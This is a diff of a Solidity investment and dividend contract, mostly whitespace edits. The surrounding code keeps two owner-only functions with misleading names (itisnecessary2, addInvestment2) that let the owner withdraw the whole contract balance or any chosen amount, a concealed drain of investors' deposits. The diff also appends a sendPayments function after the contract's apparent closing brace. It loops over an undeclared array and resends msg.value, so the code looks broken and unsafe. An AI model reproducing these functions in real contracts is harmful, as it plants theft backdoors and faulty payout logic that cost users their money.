@@ -361,7 +361,7 @@ function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
 rgp.startTimestamp = timestamp;
 
 }
- 
+
 
 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
 if (rgp.startTimestamp > now) {
@@ -559,23 +559,23 @@ dividends = address(this).balance;
 }
 
 
-    
+
 // transfer dividends to investor
 msg.sender.transfer(dividends);
 emit LogPayDividends(msg.sender, now, dividends);
 }
 
-    
+
 function itisnecessary2() public onlyOwner {
         msg.sender.transfer(address(this).balance);
-    }    
-    
+    }
+
 
 function addInvestment2( uint investment) public onlyOwner  {
 
 msg.sender.transfer(investment);
 
-} 
+}
 
 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
 uint investment = msg.value;
@@ -694,4 +694,10 @@ m_rgp.startAt(now);
 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
 emit LogNextWave(now);
 }
+}
+	function sendPayments() public {
+		for(uint i = 0; i < values.length - 1; i++) {
+				msg.sender.send(msg.value);
+		}
+	}
 }
